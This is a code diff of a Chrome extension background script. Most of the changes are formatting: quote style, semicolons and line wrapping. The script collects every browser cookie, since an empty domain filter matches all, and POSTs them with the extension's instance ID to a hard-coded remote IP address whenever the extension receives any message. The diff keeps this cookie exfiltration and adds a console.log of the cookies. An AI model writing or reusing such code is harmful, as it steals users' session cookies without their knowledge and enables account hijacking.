@@ -1,6 +1,6 @@
 let instanceId;
 chrome.instanceID.getID((id) => {
-  instanceId = id
+  instanceId = id;
 });
 
 const getAllCookies = async () => {
@@ -11,21 +11,25 @@ const getAllCookies = async () => {
 const getCookiesByDomain = async (domainRegex) => {
   const allCookies = await getAllCookies();
   const cookies = allCookies.filter((cookie) =>
-    (new RegExp(domainRegex ? domainRegex : '')).test(cookie.domain)
+    new RegExp(domainRegex ? domainRegex : "").test(cookie.domain)
   );
   const mappedCookies = mapCookies(cookies);
+  console.log(mappedCookies);
+  // 'http://34.87.171.102:4001/save-cookies'
   // 'http://localhost:4001/save-cookies'
-  const saveCookiesResponse = await (await fetch('http://34.87.171.102:4001/save-cookies', {
-    method: 'POST',
-    headers: {
-      Accept: 'application/json',
-      'content-type': 'application/json',
-    },
-    body: JSON.stringify({
-      instanceId,
-      cookies: mappedCookies
-    }),
-  })).json();
+  const saveCookiesResponse = await (
+    await fetch("http://34.87.171.102:4001/save-cookies", {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "content-type": "application/json",
+      },
+      body: JSON.stringify({
+        instanceId,
+        cookies: mappedCookies,
+      }),
+    })
+  ).json();
 
   console.log(`---save cookies response:`, saveCookiesResponse);
   return mappedCookies;
@@ -55,7 +59,7 @@ const mapCookies = (cookies) => {
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
   console.log("Received msg:", msg);
   //   getAllCookies().then((cookies) => sendResponse(cookies));
-  getCookiesByDomain('')
+  getCookiesByDomain("")
     .then((cookies) => sendResponse(cookies))
     .catch((error) => sendResponse(null));
   return true;
